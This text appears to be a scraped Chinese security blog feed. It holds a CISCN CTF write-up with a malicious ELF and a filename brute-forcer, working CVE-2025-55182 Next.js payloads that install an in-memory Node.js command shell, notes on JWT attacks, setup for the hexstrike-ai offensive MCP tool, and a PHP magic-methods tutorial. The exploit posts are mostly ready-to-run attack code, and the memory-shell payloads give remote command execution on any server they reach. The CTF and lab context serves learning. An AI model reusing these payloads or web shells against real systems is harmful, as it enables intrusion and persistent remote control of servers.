123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169#firmware.php&lt;?phpif (!isset($_SESSION['user'])||strlen($_SESSION['user'])&lt;=0){ ob_end_clean(); header('Location: /hotload.php?page=login&amp;err=1'); die();}if ($_SESSION['role']!='admin'){ $padding='Lorem ipsum dolor sit amet, consectetur adipisicing elit.'; for($i=0;$i&lt;10;$i++) $padding.=$padding; die('&lt;div&gt;&lt;div class=&quot;container&quot; style=&quot;margin-top:30px&quot;&gt;&lt;h3 style=&quot;color:red;margin-bottom:15px;&quot;&gt;只有管理员权限才能访问！&lt;/h3&gt;&lt;/div&gt;&lt;p style=&quot;visibility: hidden&quot;&gt;'.$padding.'&lt;/p&gt;&lt;/div&gt;');}if (isset($_FILES[&quot;file_data&quot;])){ if ($_FILES[&quot;file_data&quot;][&quot;error&quot;] &gt; 0||$_FILES[&quot;file_data&quot;][&quot;size&quot;] &gt; 1024*1024*1){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'上传出错，固件文件最大支持 1MB。'))); }else{ mt_srand(time()); $firmware_filename=md5(mt_rand().$_SESSION['user']); $firmware_filename=__DIR__.&quot;/../uploads/firmware/&quot;.$firmware_filename.&quot;.elf&quot;; if (time()-$_SESSION['timestamp']&lt;3){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'操作太快了，请稍后再上传。'))); } $_SESSION['timestamp']=time(); move_uploaded_file($_FILES[&quot;file_data&quot;][&quot;tmp_name&quot;], $firmware_filename); $handle = fopen($firmware_filename, &quot;rb&quot;); if ($handle==FALSE){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'上传失败，未知原因。'))); } $flags = fread($handle, 4); fclose($handle); if ($flags!==&quot;\\x7fELF&quot;){ unlink($firmware_filename); ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'上传失败，不是有效的 ELF 文件。'))); } ob_end_clean(); die(json_encode(array('status'=&gt;1,'info'=&gt;'上传成功！'))); }}else{ if (isset($_SERVER['CONTENT_TYPE'])){ if (stripos($_SERVER['CONTENT_TYPE'],'form-data')!=FALSE){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'上传出错，音乐文件最大支持 1MB。'))); } }}@$path=$_POST['path'];function clean_string($str){ $str=str_replace(&quot;\\\\&quot;,&quot;&quot;,$str); $str=str_replace(&quot;/&quot;,&quot;&quot;,$str); $str=str_replace(&quot;.&quot;,&quot;&quot;,$str); $str=str_replace(&quot;;&quot;,&quot;&quot;,$str); return substr($str,0,32);}if (isset($path)){ $path=clean_string(trim((string) $path)); if (strlen($path)&lt;=0||strlen($path)&gt;64){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'输入格式或长度不符合规定！'))); }else{ $firmware_filename=__DIR__.&quot;/../uploads/firmware/&quot;.$path.&quot;.elf&quot;; if (!file_exists($firmware_filename)){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'固件文件不存在！'))); }else{ try{ $elf = FFI::cdef(&quot; extern char * version; &quot;, $firmware_filename); $version=(string) FFI::string($elf-&gt;version); ob_end_clean(); die(json_encode(array('status'=&gt;1,'info'=&gt;'固件版本号：'.$version))); }catch(Error $e){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'加载固件文件时发生错误！'))); } } }}?&gt;&lt;script&gt;nav_active();nav_user('&lt;?php echo @$_SESSION['user']; ?&gt;');&lt;/script&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/fileinput.min.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/fileinput-rtl.min.css&quot;&gt; &lt;script src=&quot;js/fileinput.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/locales/zh.js&quot;&gt;&lt;/script&gt; &lt;div&gt;&lt;div class=&quot;container&quot; style=&quot;margin-top:30px&quot;&gt; &lt;h3 style=&quot;margin-bottom:15px;&quot;&gt;固件更新&lt;/h3&gt; &lt;input id=&quot;upload&quot; type=&quot;file&quot; class=&quot;file&quot; data-preview-file-type=&quot;text&quot; &gt; &lt;div style=&quot;height:30px&quot;&gt;&lt;/div&gt; &lt;div id=&quot;info1&quot; class=&quot;alert&quot; role=&quot;alert&quot; style='display: none;'&gt;&lt;/div&gt; &lt;script&gt; $(&quot;#upload&quot;).fileinput({language: 'zh',uploadUrl: '/hotload.php?page=firmware'}); $(&quot;#upload&quot;).on(&quot;fileuploaded&quot;, function (event, data, previewId, index) { var data = data.response; if (data.status==1){ $('#info1').removeClass('alert-danger'); $('#info1').addClass('alert-success'); }else{ $('#info1').removeClass('alert-success'); $('#info1').addClass('alert-danger'); } $('#info1').html(data.info); $('#info1').show(); }); &lt;/script&gt; &lt;hr/&gt;&lt;h4 style=&quot;text-align:left;margin-bottom:15px;color:gray;&quot;&gt;调试模式（读取固件版本号)&lt;/h4&gt; &lt;div class='form-container'&gt; &lt;div class='form-group'&gt; &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;固件文件&quot; id=&quot;path&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;button class=&quot;btn btn-info btn-block&quot; onclick=&quot;submit()&quot;&gt;读取&lt;/button&gt; &lt;/div&gt; &lt;div id=&quot;info2&quot; class=&quot;alert&quot; role=&quot;alert&quot; style=&quot;display: none;&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;script&gt;function submit(){ $('#info2').hide(); $.ajax({ type: 'POST', url: &quot;/hotload.php?page=firmware&quot;, data: {path: $('#path').val()}, dataType: &quot;json&quot;, success: function(data) { if (data.status==1){ $('#info2').removeClass('alert-danger'); $('#info2').addClass('alert-success'); }else{ $('#info2').removeClass('alert-success'); $('#info2').addClass('alert-danger'); } $('#info2').html(data.info); $('#info2').show(); } });}&lt;/script&gt; &lt;p style=&quot;visibility: hidden&quot;&gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. Animi aspernatur beatae commodi dolorem in praesentium quia quis sit ullam. Aut facere nihil non soluta temporibus. Modi molestias suscipit voluptate. A? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aliquid beatae consequatur deserunt earum eligendi ex, illum iure nostrum nulla obcaecati pariatur placeat quae reiciendis repellat similique tenetur totam vel voluptatum? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aut autem consectetur cum ex expedita id incidunt inventore ipsa laudantium maiores nihil quia quo quod rem, reprehenderit repudiandae sunt unde voluptatibus? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Accusantium ad adipisci animi, commodi cumque doloribus ducimus eaque eveniet illo iste, maxime, molestiae molestias neque nostrum odio officiis reiciendis rem voluptates? &lt;/p&gt; &lt;/div&gt; 在#firmware上传elf 1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;char _version[0x130];char *version = _version;__attribute__((constructor)) void fun() { memset(version, 0, 0x130); FILE *fp = popen(&quot;/usr/bin/tac /flag&quot;, &quot;r&quot;); if (fp == NULL) return; fread(version, 1, 0x100, fp); pclose(fp);} 编译成elf上传就可以了 爆破文件名 123456789101112131415161718192021222324&lt;?php function generate_filenames($start_time, $end_time, $user) { $results = []; for ($time = $start_time; $time &lt;= $end_time; $time++) { mt_srand($time); $rand = mt_rand(); $filename = md5($rand . $user); $results[] = $filename; } return $results; } // 已知信息 $user = &quot;admin&quot;; // 固定值 $date = strtotime(&quot;Tue, 11 Nov 2025 10:20:28 GMT&quot;); // 已知时间 $time_range = 100; // 时间偏移范围 ±100 秒 // 开始暴力破解 $start_time = $date - $time_range; $end_time = $date + $time_range; $possible_filenames = generate_filenames($start_time, $end_time, $user); foreach ($possible_filenames as $filename) { echo $filename . &quot;.elf\\n&quot;; } ?&gt; 去浏览器复制时间去爆破就行了然后把字典复制到bp里面爆就可以爆破出来 flag{iz4w8x9zjdsqael9fbv7c2l2qp5ao6f9}","link":"/2025/12/11/CISCN2019%20%E6%80%BB%E5%86%B3%E8%B5%9B%20Day1%20Web1--%E6%BB%91%E7%A8%BD%E4%BA%91%E9%9F%B3%E4%B9%90/"},{"title":"","text":"js内存马-CVE-2025-55182 版本1不知道是太长了还是什么原因 1234567891011121314{ &quot;then&quot;: &quot;$1:__proto__:then&quot;, &quot;status&quot;: &quot;resolved_model&quot;, &quot;reason&quot;: -1, &quot;value&quot;: &quot;{\\&quot;then\\&quot;:\\&quot;$B1337\\&quot;}&quot;, &quot;_response&quot;: { &quot;_prefix&quot;: &quot;(async()=&gt;{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='/deep'){const cmd=parsedUrl.query.cmd||'whoami';cp.exec(cmd,(err,stdout,stderr)=&gt;{res.writeHead(200,{'Content-Type':'application/json'});res.end(JSON.stringify({success:!err,stdout,stderr,error:err?err.message:null}));});return true;}}return originalEmit.apply(this,arguments);};})();&quot;, &quot;_chunks&quot;: &quot;$Q2&quot;, &quot;_formData&quot;: { &quot;get&quot;: &quot;$1:constructor:constructor&quot; } }}{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;value&quot;:&quot;{\\&quot;then\\&quot;:\\&quot;$B1337\\&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;(async()=&gt;{require('http').Server.prototype.emit=function(e,...a){if(e=='request'&amp;&amp;require('url').parse(a[0].url).pathname=='/shell'){require('child_process').exec(a[0].query.c||'id',(e,o,s)=&gt;a[1].end(JSON.stringify({o,s})));return true}return this.__proto__.emit.apply(this,arguments)}})();&quot;,&quot;_chunks&quot;:&quot;$Q&quot;}} CVE-2025-55182 春秋云镜复现 123456789101112131415161718POST /apps HTTP/2Host: eci-2zeiverm334jp4jylqln.cloudeci1.ichunqiu.comUser-Agent: Mozilla/5.0Accept-Encoding: gzip, deflateNext-Action: xX-Nextjs-Request-Id: test123Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryContent-Length: 594------WebKitFormBoundaryContent-Disposition: form-data; name=&quot;0&quot;{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;value&quot;:&quot;{\\&quot;then\\&quot;:\\&quot;$B1337\\&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;(async()=&gt;{require('http').Server.prototype.emit=function(e,...a){if(e=='request'&amp;&amp;require('url').parse(a[0].url).pathname=='/shell'){require('child_process').exec(a[0].query.c||'id',(e,o,s)=&gt;a[1].end(JSON.stringify({o,s})));return true}return this.__proto__.emit.apply(this,arguments)}})();&quot;,&quot;_chunks&quot;:&quot;$Q&quot;}}------WebKitFormBoundaryContent-Disposition: form-data; name=&quot;1&quot;&quot;$@0&quot;------WebKitFormBoundary-- 访问获取flag 1/deep?cmd=cd%20../../;cat%20/flag","link":"/2025/12/11/js%E5%86%85%E5%AD%98%E9%A9%AC-CVE-2025-55182/"},{"title":"","text":"JWT 攻击 JWT，常用三种手法：未校验签名、禁用哈希、暴破弱密钥。 未校验签名： 某些服务端并未校验 JWT 签名，所以，尝试修改 token 后直接发给服务端，查看结果。于是，将 user 字段值从 admin123 改为 admin 后，重新生成新 token：jwt在线解密/加密 - JSON中文网 直接把username改成admin再去编码发现500错误 继续下一个攻击 禁用哈希。JWT 第一部分含有 alg 字段，该字段指定生成签名采用哪种哈希算法，该站使用的是 HS256，可将该字段篡改为none，某些 JWT 的实现，一旦发现 alg 为 none，将不再生成哈希签名，自然不存在校验签名一说 https://jwt.io/#debugger将 alg 为 none 视为恶意行为，所以，无法通过在线工具生成 JWT： 所以直接使用 python的 pyjwt库 用 none 算法生成的 JWT 只有两部分了，根本连签名都没生成。将新的 token 发给服务端 依旧500错误 暴破弱密钥。 在GitHub上面找到一个py脚本https://github.com/Ch1ngg/JWTPyCrack","link":"/2025/12/11/jwt/"},{"title":"","text":"hexstrike-ai kali作为服务端，Windows作为客户端kali的IP：192.168.1.101 启动hexstrlike-ai 12345cd /home/challenge/Desktop/hexstrike-aisource venv/bin/activatepython3 hexstrike_server.py 客户端启动 1python hexstrike_mcp.py --server http://192.168.1.101:8888 --debug trae的mcp配置文件 123456789101112131415{ &quot;mcpServers&quot;: { &quot;hexstrike-ai&quot;: { &quot;command&quot;: &quot;D:\\\\env\\\\Python\\\\Python313\\\\python.exe&quot;, &quot;args&quot;: [ &quot;D:\\\\hexstrike-ai\\\\hexstrike_mcp.py&quot;, &quot;--server&quot;, &quot;http://192.168.1.101:8888&quot; ], &quot;description&quot;: &quot;HexStrike AI v6.0 - Advanced Cybersecurity Automation Platform&quot;, &quot;timeout&quot;: 300, &quot;disabled&quot;: false } }} MCP调试工具启动，这个默认启动最新版本 1npx @modelcontextprotocol/inspector 点链接进入浏览器 如下所示 Command 1D:\\env\\Python\\Python313\\python.exe Arguments 1D:\\\\hexstrike-ai\\\\hexstrike_mcp.py --server http://192.168.1.101:8888 然后就可以用这个页面去微调MCP了像一些什么提示词之类的","link":"/2025/12/11/hexstrlike-ai/"},{"title":"","text":"PHP魔术方法 前言PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括： __construct()，类的构造函数 __destruct()，类的析构函数 __call()，在对象中调用一个不可访问方法时调用 __callStatic()，用静态方式中调用一个不可访问方法时调用 __get()，获得一个类的成员变量时调用 __set()，设置一个类的成员变量时调用 __isset()，当对不可访问属性调用isset()或empty()时调用 __unset()，当对不可访问属性调用unset()时被调用。 __sleep()，执行serialize()时，先会调用这个函数 __wakeup()，执行unserialize()时，先会调用这个函数 __toString()，类被当成字符串时的回应方法 __invoke()，调用函数的方式调用一个对象时的回应方法 __set_state()，调用var_export()导出类时，此静态方法会被调用。 __clone()，当对象复制完成时调用 __autoload()，尝试加载未定义的类 __debugInfo()，打印所需调试信息 范例下面让我们以实例的形式向大家讲解下这几个魔术方法时如何使用的。 一、 __construct()，类的构造函数php中构造方法是对象创建完成后第一个被对象自动调用的方法。在每个类中都有一个构造方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。 1、 构造方法的作用 通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。 2、 构造方法的在类中的声明格式 1234function __constrct([参数列表]){ 方法体 //通常用来对成员属性进行初始化赋值} 3、 在类中声明构造方法需要注意的事项 1231、在同一个类中只能声明一个构造方法，原因是，PHP不支持构造函数重载。2、构造方法名称是以两个下画线开始的__construct() 下面是它的例子： 1234567891011121314151617181920212223242526&lt;?php class Person { public $name; public $age; public $sex; /** * 显示声明一个构造方法且带参数 */ public function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=27) { $this-&gt;name = $name; $this-&gt;sex = $sex; $this-&gt;age = $age; } /** * say 方法 */ public function say() { echo &quot;我叫：&quot; . $this-&gt;name . &quot;，性别：&quot; . $this-&gt;sex . &quot;，年龄：&quot; . $this-&gt;age; } } 创建对象$Person1且不带任参数 12$Person1 = new Person();echo $Person1-&gt;say(); //输出:我叫：，性别：男，年龄：27 创建对象$Person2且带参数“小明” 12$Person2 = new Person(&quot;小明&quot;);echo $Person2-&gt;say(); //输出：我叫：张三，性别：男，年龄：27 创建对象$Person3且带三个参数 12$Person3 = new Person(&quot;李四&quot;,&quot;男&quot;,25);echo $Person3-&gt;say(); //输出：我叫：李四，性别：男，年龄：25 二、__destruct()，类的析构函数通过上面的讲解，现在我们已经知道了什么叫构造方法。那么与构造方法对应的就是析构方法。 析构方法允许在销毁一个类之前执行的一些操作或完成一些功能，比如说关闭文件、释放结果集等。 析构方法是PHP5才引进的新内容。 析造方法的声明格式与构造方法 __construct() 比较类似，也是以两个下划线开始的方法 __destruct() ，这种析构方法名称也是固定的。 1、 析构方法的声明格式 1234function __destruct(){ //方法体} 注意：析构函数不能带有任何参数。 2、 析构方法的作用 1一般来说，析构方法在PHP中并不是很常用，它属类中可选择的一部分，通常用来完成一些在对象销毁前的清理任务。 举例演示，如下： 123456789101112131415161718192021222324252627282930313233&lt;?phpclass Person{ public $name; public $age; public $sex; public function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=22) { $this-&gt;name = $name; $this-&gt;sex = $sex; $this-&gt;age = $age; } /** * say 说话方法 */ public function say() { echo &quot;我叫：&quot;.$this-&gt;name.&quot;，性别：&quot;.$this-&gt;sex.&quot;，年龄：&quot;.$this-&gt;age; } /** * 声明一个析构方法 */ public function __destruct() { echo &quot;我觉得我还可以再抢救一下，我的名字叫&quot;.$this-&gt;name; }}$Person = new Person(&quot;小明&quot;);unset($Person); //销毁上面创建的对象$Person 上面的程序运行时输出： 1我觉得我还可以再抢救一下，我的名字叫小明 三、 __call()，在对象中调用一个不可访问方法时调用。该方法有两个参数，第一个参数 $function_name 会自动接收不存在的方法名，第二个 $arguments 则以数组的方式接收不存在方法的多个参数。 1、 __call() 方法的格式： 1234function __call(string $function_name, array $arguments){ // 方法体} 2、 __call() 方法的作用： 123为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 __call() 方法来避免。该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。 请参考如下代码： 1234567891011121314151617181920212223&lt;?phpclass Person{ function say() { echo &quot;Hello, world!&lt;br&gt;&quot;; } /** * 声明此方法用来处理调用对象中不存在的方法 */ function __call($funName, $arguments) { echo &quot;你所调用的函数：&quot; . $funName . &quot;(参数：&quot; ; // 输出调用不存在的方法名 print_r($arguments); // 输出调用不存在的方法时的参数列表 echo &quot;)不存在！&lt;br&gt;\\n&quot;; // 结束换行 } }$Person = new Person(); $Person-&gt;run(&quot;teacher&quot;); // 调用对象中不存在的方法，则自动调用了对象中的__call()方法$Person-&gt;eat(&quot;小明&quot;, &quot;苹果&quot;); $Person-&gt;say(); 运行结果： 12345你所调用的函数：run(参数：Array ( [0] =&gt; teacher ) )不存在！你所调用的函数：eat(参数：Array ( [0] =&gt; 小明 [1] =&gt; 苹果 ) )不存在！Hello, world! 四、 __callStatic()，用静态方式中调用一个不可访问方法时调用此方法与上面所说的 __call() 功能除了 __callStatic() 是未静态方法准备的之外，其它都是一样的。 请看下面代码： 1234567891011121314151617181920212223&lt;?phpclass Person{ function say() { echo &quot;Hello, world!&lt;br&gt;&quot;; } /** * 声明此方法用来处理调用对象中不存在的方法 */ public static function __callStatic($funName, $arguments) { echo &quot;你所调用的静态方法：&quot; . $funName . &quot;(参数：&quot; ; // 输出调用不存在的方法名 print_r($arguments); // 输出调用不存在的方法时的参数列表 echo &quot;)不存在！&lt;br&gt;\\n&quot;; // 结束换行 }}$Person = new Person();$Person::run(&quot;teacher&quot;); // 调用对象中不存在的方法，则自动调用了对象中的__call()方法$Person::eat(&quot;小明&quot;, &quot;苹果&quot;);$Person-&gt;say(); 运行结果如下： 123你所调用的静态方法：run(参数：Array ( [0] =&gt; teacher ) )不存在！你所调用的静态方法：eat(参数：Array ( [0] =&gt; 小明 [1] =&gt; 苹果 ) )不存在！Hello, world! 五、 __get()，获得一个类的成员变量时调用在 php 面向对象编程中，类的成员属性被设定为 private 后，如果我们试图在外面调用它则会出现“不能访问某个私有属性”的错误。那么为了解决这个问题，我们可以使用魔术方法 __get()。 魔术方法__get()的作用 1在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值。 我们通过下面的 __get() 的实例来更进一步的连接它吧： 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass Person{ private $name; private $age; function __construct($name=&quot;&quot;, $age=1) { $this-&gt;name = $name; $this-&gt;age = $age; } /** * 在类中添加__get()方法，在直接获取属性值时自动调用一次，以属性名作为参数传入并处理 * @param $propertyName * * @return int */ public function __get($propertyName) { if ($propertyName == &quot;age&quot;) { if ($this-&gt;age &gt; 30) { return $this-&gt;age - 10; } else { return $this-&gt;$propertyName; } } else { return $this-&gt;$propertyName; } }}$Person = new Person(&quot;小明&quot;, 60); // 通过Person类实例化的对象，并通过构造方法为属性赋初值echo &quot;姓名：&quot; . $Person-&gt;name . &quot;&lt;br&gt;&quot;; // 直接访问私有属性name，自动调用了__get()方法可以间接获取echo &quot;年龄：&quot; . $Person-&gt;age . &quot;&lt;br&gt;&quot;; // 自动调用了__get()方法，根据对象本身的情况会返回不同的值 运行结果： 12姓名：小明年龄：50 六、 __set()，设置一个类的成员变量时调用 __set() 的作用： __set( value )` 方法用来设置私有属性， 给一个未定义的属性赋值时，此方法会被触发，传递的参数是被设置的属性名和值。 请看下面的演示代码： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass Person{ private $name; private $age; public function __construct($name=&quot;&quot;, $age=25) { $this-&gt;name = $name; $this-&gt;age = $age; } /** * 声明魔术方法需要两个参数，真接为私有属性赋值时自动调用，并可以屏蔽一些非法赋值 * @param $property * @param $value */ public function __set($property, $value) { if ($property==&quot;age&quot;) { if ($value &gt; 150 || $value &lt; 0) { return; } } $this-&gt;$property = $value; } /** * 在类中声明说话的方法，将所有的私有属性说出 */ public function say(){ echo &quot;我叫&quot;.$this-&gt;name.&quot;，今年&quot;.$this-&gt;age.&quot;岁了&quot;; }}$Person=new Person(&quot;小明&quot;, 25); //注意，初始值将被下面所改变//自动调用了__set()函数，将属性名name传给第一个参数，将属性值”李四”传给第二个参数$Person-&gt;name = &quot;小红&quot;; //赋值成功。如果没有__set()，则出错。//自动调用了__set()函数，将属性名age传给第一个参数，将属性值26传给第二个参数$Person-&gt;age = 16; //赋值成功$Person-&gt;age = 160; //160是一个非法值，赋值失效$Person-&gt;say(); //输出：我叫小红，今年16岁了 运行结果： 1我叫小红，今年16岁了 七、 __isset()，当对不可访问属性调用isset()或empty()时调用在看这个方法之前我们看一下isset()函数的应用，isset()是测定变量是否设定用的函数，传入一个变量作为参数，如果传入的变量存在则传回true，否则传回false。 那么如果在一个对象外面使用isset()这个函数去测定对象里面的成员是否被设定可不可以用它呢？ 分两种情况，如果对象里面成员是公有的，我们就可以使用这个函数来测定成员属性，如果是私有的成员属性，这个函数就不起作用了，原因就是因为私有的被封装了，在外部不可见。那么我们就不可以在对象的外部使用isset()函数来测定私有成员属性是否被设定了呢？当然是可以的，但不是一成不变。你只要在类里面加上一个__isset()方法就可以了，当在类外部使用isset()函数来测定对象里面的私有成员是否被设定时，就会自动调用类里面的__isset()方法了帮我们完成这样的操作。 __isset()的作用：当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。 请看下面代码演示： 1234567891011121314151617181920212223242526272829&lt;?phpclass Person{ public $sex; private $name; private $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @param $content * * @return bool */ public function __isset($content) { echo &quot;当在类外部使用isset()函数测定私有成员{$content}时，自动调用&lt;br&gt;&quot;; echo isset($this-&gt;$content); }}$person = new Person(&quot;小明&quot;, 25); // 初始赋值echo isset($person-&gt;sex),&quot;&lt;br&gt;&quot;;echo isset($person-&gt;name),&quot;&lt;br&gt;&quot;;echo isset($person-&gt;age),&quot;&lt;br&gt;&quot;; 运行结果如下： 123451 // public 可以 isset()当在类外部使用isset()函数测定私有成员name时，自动调用 // __isset() 内 第一个echo1 // __isset() 内第二个echo当在类外部使用isset()函数测定私有成员age时，自动调用 // __isset() 内 第一个echo1 // __isset() 内第二个echo 八、 __unset()，当对不可访问属性调用unset()时被调用。看这个方法之前呢，我们也先来看一下 unset() 函数，unset()这个函数的作用是删除指定的变量且传回true，参数为要删除的变量。 那么如果在一个对象外部去删除对象内部的成员属性用unset()函数可以吗？ 这里自然也是分两种情况： 1、 如果一个对象里面的成员属性是公有的，就可以使用这个函数在对象外面删除对象的公有属性。 2、 如果对象的成员属性是私有的，我使用这个函数就没有权限去删除。 虽然有以上两种情况，但我想说的是同样如果你在一个对象里面加上__unset()这个方法，就可以在对象的外部去删除对象的私有成员属性了。在对象里面加上了__unset()这个方法之后，在对象外部使用“unset()”函数删除对象内部的私有成员属性时，对象会自动调用__unset()函数来帮我们删除对象内部的私有成员属性。 请看如下代码： 1234567891011121314151617181920212223242526272829&lt;?phpclass Person{ public $sex; private $name; private $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @param $content * * @return bool */ public function __unset($content) { echo &quot;当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;&quot;; echo isset($this-&gt;$content); }}$person = new Person(&quot;小明&quot;, 25); // 初始赋值unset($person-&gt;sex);unset($person-&gt;name);unset($person-&gt;age); 运行结果： 123当在类外部使用unset()函数来删除私有成员时自动调用的1当在类外部使用unset()函数来删除私有成员时自动调用的1 九、 __sleep()，执行serialize()时，先会调用这个函数serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。 此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。 如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 注意： 1__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。 作用： 1__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。 具体请参考如下代码： 123456789101112131415161718192021222324252627&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @return array */ public function __sleep() { echo &quot;当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;&quot;; $this-&gt;name = base64_encode($this-&gt;name); return array('name', 'age'); // 这里必须返回一个数值，里边的元素表示返回的属性名称 }}$person = new Person('小明'); // 初始赋值echo serialize($person);echo '&lt;br/&gt;'; 代码运行结果： 12当在类外部使用serialize()时会调用这里的__sleep()方法O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;} 十、 __wakeup()，执行unserialize()时，先会调用这个函数如果说 __sleep() 是白的，那么 __wakeup() 就是黑的了。 那么为什么呢？ 因为： 1与之相反，`unserialize()` 会检查是否存在一个 `__wakeup()` 方法。如果存在，则会先调用 `__wakeup` 方法，预先准备对象需要的资源。 作用： 1__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。 还是看代码： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @return array */ public function __sleep() { echo &quot;当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;&quot;; $this-&gt;name = base64_encode($this-&gt;name); return array('name', 'age'); // 这里必须返回一个数值，里边的元素表示返回的属性名称 } /** * __wakeup */ public function __wakeup() { echo &quot;当在类外部使用unserialize()时会调用这里的__wakeup()方法&lt;br&gt;&quot;; $this-&gt;name = 2; $this-&gt;sex = '男'; // 这里不需要返回数组 }}$person = new Person('小明'); // 初始赋值var_dump(serialize($person));var_dump(unserialize(serialize($person))); 运行结果： 1234当在类外部使用serialize()时会调用这里的__sleep()方法string(58) &quot;O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;}&quot; 当在类外部使用serialize()时会调用这里的__sleep()方法当在类外部使用unserialize()时会调用这里的__wakeup()方法object(Person)#2 (3) { [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; int(2) [&quot;age&quot;]=&gt; int(25) } 十一、 __toString()，类被当成字符串时的回应方法作用： 1__toString() 方法用于一个类被当成字符串时应怎样回应。例如 `echo $obj;` 应该显示些什么。 注意： 1此方法必须返回一个字符串，否则将发出一条 `E_RECOVERABLE_ERROR` 级别的致命错误。 警告： 1不能在 __toString() 方法中抛出异常。这么做会导致致命错误。 代码： 12345678910111213141516171819202122&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public function __toString() { return 'go go go'; }}$person = new Person('小明'); // 初始赋值echo $person; 结果： 1go go go 那么如果类中没有 __toString() 这个魔术方法运行会发生什么呢？让我们来测试下： 代码： 123456789101112131415161718&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } }$person = new Person('小明'); // 初始赋值echo $person; 结果： 1Catchable fatal error: Object of class Person could not be converted to string in D:\\phpStudy\\WWW\\test\\index.php on line 18 很明显，页面报了一个致命错误，这是语法所不允许的。 十二、 __invoke()，调用函数的方式调用一个对象时的回应方法作用： 1当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。 注意： 1本特性只在 PHP 5.3.0 及以上版本有效。 直接上代码： 12345678910111213141516171819202122&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public function __invoke() { echo '这可是一个对象哦'; }}$person = new Person('小明'); // 初始赋值$person(); 查看运行结果： 